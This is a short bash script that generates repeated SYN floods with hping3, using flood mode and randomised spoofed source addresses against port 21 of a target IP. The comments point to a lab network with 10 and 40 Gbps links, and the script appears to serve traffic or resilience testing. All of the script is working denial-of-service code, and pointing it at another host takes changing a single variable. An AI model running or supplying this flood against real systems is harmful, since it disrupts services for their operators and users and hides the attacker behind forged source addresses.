#!/bin/bash

# This script generates SYN floods using hping3

# intensity varies based on the data size (less data per packet = more intense attack)
# more attack commands means more packets sent
# target IP (10.10.1.1 is a 10 Gbps link to kelewan)
# 10.40.1.1 is 40 Gbps link
#target=169.237.10.84
target=10.40.1.1

# TCP window size
window=1MB

# hping3 SYN flood settings
pkt_count=1000000
data_size=64
data_size_increment=64
hping_window=64
hping_port=21
# run iperf client as daemon

# number of hping floods
hping_count=10
# time between hping floods, 0 to start at same time
hping_time=10
# set duration less than or equal to hping_time to have clear seperation
attack_duration=10
for ((i=1;i<=hping_count;i++)); do
        timeout $attack_duration hping3 -c $pkt_count -d $((data_size + (i-1)*data_size_increment)) -S -w $hping_window -p $hping_port --flood --rand-source $target &
            echo "sending SYN flood..."
            sleep $hping_time
    done
